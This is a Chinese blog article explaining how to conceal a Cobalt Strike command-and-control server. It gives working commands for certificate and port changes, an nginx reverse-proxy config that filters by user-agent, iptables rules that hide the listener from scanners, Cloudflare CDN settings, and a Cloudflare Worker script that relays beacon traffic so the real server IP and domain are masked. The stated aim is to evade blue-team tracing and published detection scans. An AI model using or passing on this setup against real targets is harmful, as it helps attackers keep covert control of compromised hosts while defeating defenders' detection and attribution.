> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/no950-wK4kZgbXyu9Nz_EQ)

前言
==

首先红蓝对抗的时候，如果未修改 CS 特征、容易被蓝队溯源。  
前段时间 360 公布了 cobalt strike stage uri 的特征，并且紧接着 nmap 扫描插件也发布了。虽说这个特征很早就被发现了，但最近正好我的 ip 被卡巴斯基拉黑了 /(ㄒ o ㄒ)/~~，所以来折腾一下。  
![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM63CsXjk1mQf4chibox4wSl7EVoxB0GEI5II5AibYdc44IdW9hibibiaDjGiaRKzCxJUufRJLHOplEicZsQQ/640?wx_fmt=png)  
关于隐藏 cobalt strike 的特征，网上有很多方法。例如 nginx 反代、域前置、修改源码等方法。本此主要从 nginx 反代、cloudflare cdn、cloudflare worker 这三个方面说一下如何隐藏 cobalt strike stage uri 的特征，以及进一步隐藏 c2 域名和 IP 的方法。并记录一下部署过程中遇到的坑点。  
想了解域前置技术的小伙伴可以先百度了解一下。cloudflare 无法使用域前置，因为它会校验 SNI。目前不知到阿里云还行不行。本着匿名，加上 cloudlfare 免费、对国外访问支持比较好的特点，所以选择了 cloudflare。下面介绍一下常见的去特征方式。

去特征的几种常见方法
==========

1、更改默认端口  
方法一、直接编辑 teamserver 进行启动项修改。  
vi teamserver  
方法二、启动时候指定 server_port  
`java -XX:ParallelGCThreads=4 -Duser.language=en -Dcobaltstrike.server_port=50505 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=123456 -server -XX:+AggressiveHeap -XX:+UseParallelGC -Xmx1024m -classpath ./cobaltstrike.jar server.TeamServer xxx.xxx.xx.xx test google.profile`

2、去除证书特征  
Cobalt Strike 默认的证书已经是分分钟被逮, 所以需要生成一个新的证书  
这里可以用 keytool 这个工具。操作简单。Keytool 是一个 Java 数据证书的管理工具, Keytool 将密钥（key）和证书（certificates）存在一个称为 keystore 的文件中, 即 store 后缀文件中。

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM63CsXjk1mQf4chibox4wSl7eZDylg5G0aQdBsic1CfVCJMNJHEoPAKD6iaxmWHYavxLckgYzeSuAUJw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM63CsXjk1mQf4chibox4wSl7kLic5h1MM9zWghwlWREO5wicDfYd32JHMEZTPibFPo9N8K2I5icIjnaj5A/640?wx_fmt=png)

使用命令

```
keytool -keystore CobaltStrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu.com -dname "CN=ZhongGuo, OU=CC, O=CCSEC, L=BeiJing, ST=ChaoYang, C=CN"
```

没改之前  
![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM63CsXjk1mQf4chibox4wSl7MDh8lrK2KdUqX4tx1KhLV2ibBcEv3GdGabeSrd2kvUS8cwdLA1Y6MvA/640?wx_fmt=png)  
改了之后  
![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM63CsXjk1mQf4chibox4wSl7rjwicbWDgwyerD8q8Kx8ht3D2gHDibwIbBQEuVrN93UWcz0gzOwhKJhQ/640?wx_fmt=png)  
这些只是要了解的基础, 接下来我们就在这上面的基础上, 再添加几步。

部署 Nginx 反向代理以及 https 上线
========================

如果在 cobalt strike 的 c2 malleable 配置文件中没有自定义 http-stager 的 uri。默认情况下，通过访问默认的 uri，就能获取到 cs 的 shellcode。加密 shellcode 的密钥又是固定的 (3.x 0x69，4.x 0x2e)，所以能从 shellcode 中解出 c2 域名等配置信息。如图是 nmap 扫描插件的扫描结果。  
![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM63CsXjk1mQf4chibox4wSl7D4NKaaiaZOlIrzs11oCPPvV4BBUzFgogiaOicxHLeJ7KrSfaicDY0SSib6w/640?wx_fmt=png)  
修改这个特征的方法有很多, 可以修改源码加密的密钥，参考：[Bypass cobaltstrike beacon config scan](https://mp.weixin.qq.com/s?__biz=MzU2NTc2MjAyNg==&mid=2247484689&idx=1&sn=8cf9c031f3d926c155ee5c018941b416&scene=21#wechat_redirect)  
但是光这样也很容易被扫描检测到, 所以我们最好还得配置防火墙, 限制访问 Cs 监听的端口  
接下来介绍的是我用的一种方法：设置 iptables，只允许 localhost 访问 cs listener 监听的端口。将外部请求通过 nginx 转发到 localhost 上的 listener。还可以在 nginx 上设置过滤规则来允许特定请求。

配置 / etc/nginx/nginx.conf 文件
============================

首先配置 conf 文件, Nginx 一键安装, 在配置文件中设置只允许特定的请求头访问 CS 的监听端口。这里要根据你的 cs 配置文件来进行利用，我用的是 jquery-c2.4.0.profile  
配置如下：只有用我们所指定的请求头的请求才能被反向代理到 stage uri

```
location ~*/jquery {
        if ($http_user_agent != "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko") {
        return 302 $REDIRECT_DOMAIN$request_uri;
        }
        proxy_pass          https://127.0.0.1:5553;
```

申请 https 证书
===========

这里可以直接在 cloudflare 上申请，非常方便, 选择默认的 pem 格式  
![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM63CsXjk1mQf4chibox4wSl77BRJ3mp4RnFK28axWQWBsv1h8h9jOKibpD77xOibQdhPflFfgxWezJeQ/640?wx_fmt=png)  
分别复制内容保存为 key.pem 和 chain.pem 上传到 cs 的服务器上，再在 nginx 配置文件中启用证书。

```
server_name  img.xxxx.tk
root         /usr/share/nginx/html;
ssl_certificate "/usr/local/cs/all/uploads/sss.pem";
ssl_certificate_key "/usr/local/cs/all/uploads/ssk.pem";
ssl_session_cache shared:SSL:1m;
ssl_session_timeout  1440m;
ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # managed by Certbot
ssl_prefer_server_ciphers on; # managed by Certbot
```

为 cobalt strike 配置证书
====================

*   1. 生成 img.xxxx.tk.store 文件  
    `openssl pkcs12 -export -in /api.xxx.com/sss.pem -inkey /api.xxx.com/ssk.pem -out api.xxx.com.p12 -name api.xxx.com -passout pass:123456`  
    `keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore api.xxx.com -srckeystore api.xxx.com.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias api.xxx.com`
    
*   2. 将生成的 api.xxx.com.store 放到 cs 目录下，修改 teamserver 文件最后一行, 将 cobaltstrike.store 修改为 api.xxx.com.store 和 store 文件对应的密码。  
    （有必要的话，把端口号也可以改了并设置 iptables 只允许特定 ip 访问）  
    `java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=40120 -Djavax.net.ssl.keyStore=./api.xxx.com.store -Djavax.net.ssl.keyStorePassword=123456 -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar server.TeamServer $*`
    
*   3. 将 keystore 加入 Malleable C2 profile 中
    

```
https-certificate {
     set keystore “api.xxx.com.store”;
     set password “123456”;
}
```

然后启动 cs 设置 listener。  
![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM63CsXjk1mQf4chibox4wSl7wx1ImbtXefqJCXCxJogwZZ1dab25icNnqlXXwryJpqSB2JJcBTRawwQ/640?wx_fmt=png)  
这里 https port(bind): 设置的 43211（cs 会把端口开在 43211），在 nginx 配置文件中的将 proxy_pass 设置为：https://127.0.0.1:43211。  
开启 listener 之后设置 iptables，只允许 127.0.0.1 访问。这下 nmap 也就扫不出来了。

```
iptables -A INPUT -s 127.0.0.1 -p tcp --dport 43211 -j ACCEPT
iptables -A INPUT -p tcp --dport 43211 -j DROP
```

到此为止，隐藏 cobalt strike 特征的设置就暂时告一段落，下面继续说如何隐藏 cs 服务器 ip 和域名。

配置 cloudflare cdn
=================

1. 先添加域名  
![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM63CsXjk1mQf4chibox4wSl7kMGVBSCsxrIj4QjEWMeHrkibE2Fdd78hMYRYY4hBGNx0I9FlKg8N1rA/640?wx_fmt=png)

2. 添加 A 记录，指向 VPS 的 IP 地址  
选择免费版本，设置要加速的子域名，并在你的域名服务商处修改域名解析 dns 为 cloudflare 的 dns。

3. 稍等一会，经过 cloudflare 验证成功后，本地 nslookup 域名，看一下生效没有。  
![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM63CsXjk1mQf4chibox4wSl7tsSiakoCNJ0XyAHWm7Enl3Ub8opVzx5zqdOYAKXIkg9FLq9TjplXQ7Q/640?wx_fmt=png)

 关闭缓存
=====

为了实时受到我们的命令的响应: 我们需要修改缓存规则：  
![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM63CsXjk1mQf4chibox4wSl7LJ4SialE9VA2L1hbibJ7Xk3Tg273OyhkKJiaXgyB9tZu9Vm33vqsH1HQg/640?wx_fmt=png)  
cloudflare 能开启开发模式，来禁用缓存，但是只有 3 个小时。我们可以通过页面规则来永久设置缓存规则。  
![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM63CsXjk1mQf4chibox4wSl7ZWw79KNjzESaLLFpoZgFK9U966IxdOraiaeQwngebCSZ0bO6AtaegPQ/640?wx_fmt=png)  
因为 cs 配置文件中设置的 uri 都是 js 结尾的，所以这里使用`*js`来匹配所有 uri。

坑点
==

这里设置 cs 配置文件时候需要, 需要将头设置为`header "Content-Type" "application/*; charset=utf-8";`不然可能会出现能上线但是无法回显命令的情况  
这里的 mime-type 如果为 application/javascript、text/html 等，机器执行命令就无法回显。我怀疑是 cdn 会检测响应头 content-type 的值，如果是一些静态文件的 mime-type 可能就导致这个问题。  
至此，cdn 就配置完了。并且能通过 cdn 正常上线。

配置 cloudflare worker
====================

配置这个就类似域前置的作用，但是能找到还能够进行域前置技术的 CDN 还是用域前置比较好，cloudfalre worker 可以说只是一个替代品。  
cloudflare worker 能够执行无服务器函数，免费用户有 10 万请求 / 每天的额度。并且你能自定义 workers.dev 的子域。我们可以编写 js 处理以及转发请求。  
![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM63CsXjk1mQf4chibox4wSl7SibwJsQXicHTI9yNpYSegua9icOQjRDOwl6LCL7fyeVZLeic4kBJS1Os1A/640?wx_fmt=png)  
js 脚本如下，需要设置 X-Forwarded-For 头，不然上线的 ip 是 worker 的 ipv6 地址。

```
let upstream = 'https://img.xxx.tk'

addEventListener('fetch', event => {
    event.respondWith(fetchAndApply(event.request));
})

async function fetchAndApply(request) {
    const ipAddress = request.headers.get('cf-connecting-ip') || '';
    let requestURL = new URL(request.url);
    let upstreamURL = new URL(upstream);
    requestURL.protocol = upstreamURL.protocol;
    requestURL.host = upstreamURL.host;
    requestURL.pathname = upstreamURL.pathname + requestURL.pathname;

    let new_request_headers = new Headers(request.headers);
    new_request_headers.set("X-Forwarded-For", ipAddress);
    let fetchedResponse = await fetch(
        new Request(requestURL, {
            method: request.method,
            headers: new_request_headers,
            body: request.body
        })
    );
    let modifiedResponseHeaders = new Headers(fetchedResponse.headers);
    modifiedResponseHeaders.delete('set-cookie');
    return new Response(
        fetchedResponse.body,
        {
            headers: modifiedResponseHeaders,
            status: fetchedResponse.status,
            statusText: fetchedResponse.statusText
        }
    );
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM63CsXjk1mQf4chibox4wSl7tznv3icticcSpQw4Ee8QKkvJoN5VycWaG2vZcs2eH8pRTL0uksVCGafQ/640?wx_fmt=png)  
点击保存部署，访问 xxx.ttttt-api.workers.dev 域名，看看是否正常。然后在 listener 中设置  
![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM63CsXjk1mQf4chibox4wSl7vGs8N7q6YfsR2daaWRAwa3WpQZTFtRR9w7qicCmOUzOvJDfk64sKkwQ/640?wx_fmt=png)  
到此设置完毕。  
之后通信的请求都是通过 xxx.xxx.workers.dev 进行的，隐藏了真实域名。并且 shellcode 通信的 ip 地址也是 cloudflare 的 ip。

公众号

最后  

-----

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**无害实验室拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的**